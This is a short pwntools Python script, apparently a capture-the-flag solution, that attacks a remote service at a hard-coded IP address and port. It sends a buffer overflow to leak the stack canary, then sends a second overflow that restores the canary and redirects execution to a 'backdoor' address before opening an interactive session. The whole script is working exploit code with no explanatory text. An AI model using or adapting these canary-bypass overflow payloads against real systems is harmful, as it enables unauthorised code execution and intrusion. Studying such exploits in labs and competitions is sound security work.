from pwn import *
#context.log_level = 'debug'
#p=process("./TT")
p=remote("121.40.92.129",28020)
#gdb.attach(p)
v1=0x75bc371
backdoor=0x08048660
#dword_804B01C=0x0804B01C
#canary=0xe3108800
payload="a"*(0x5c)+p32(v1)
p.sendline(payload)
p.recvuntil(":")
canary1=p.recv().replace("\n","")
canary2=int(canary1,16)
#canary=int(p.recv(),16)
#print (canary1)
payload2="a"*10+p32(canary2)+"a"*4+p32(0x0804B020)+"a"*4+p32(backdoor)
p.sendline(payload2)
p.interactive()
